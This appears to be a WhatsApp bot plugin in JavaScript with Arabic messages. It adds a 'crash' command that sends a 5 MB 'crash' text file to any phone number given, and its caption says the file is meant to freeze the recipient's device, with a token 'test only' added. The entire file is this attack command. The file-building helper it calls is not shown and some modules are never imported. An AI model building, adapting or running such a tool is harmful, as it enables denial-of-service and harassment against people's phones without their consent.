module.exports = async ({ sock, msg, text, reply }) => {
  if (!text.startsWith('crash')) return;

  const parts = text.trim().split(' ');
  const number = parts[1];

  if (!number || isNaN(number)) {
    return reply("❌ يرجى كتابة رقم الهاتف بعد الأمر.\nمثال: crash 966xxxxxxxxx");
  }

  const jid = `${number}@s.whatsapp.net`;
  const crashFilePath = path.join(__dirname, '../temp/crash.txt');

  try {
    // إنشاء ملف crash بحجم 5 ميجابايت
    createCrashFile(crashFilePath, 5);

    // إرسال الملف كوثيقة نصية في واتساب
    await sock.sendMessage(jid, {
      document: {
        url: `file://${crashFilePath}`
      },
      mimetype: 'text/plain',
      fileName: 'crash.txt',
      caption: 'ملف Crash لتهنيج الجهاز (اختبار فقط!)'
    });

    // حذف الملف المؤقت فوراً
    fs.unlinkSync(crashFilePath);

    await reply(`✅ تم إرسال ملف Crash إلى: ${number}`);
  } catch (err) {
    console.error(err);
    await reply(`❌ فشل في إرسال ملف Crash إلى: ${number}`);
  }
};
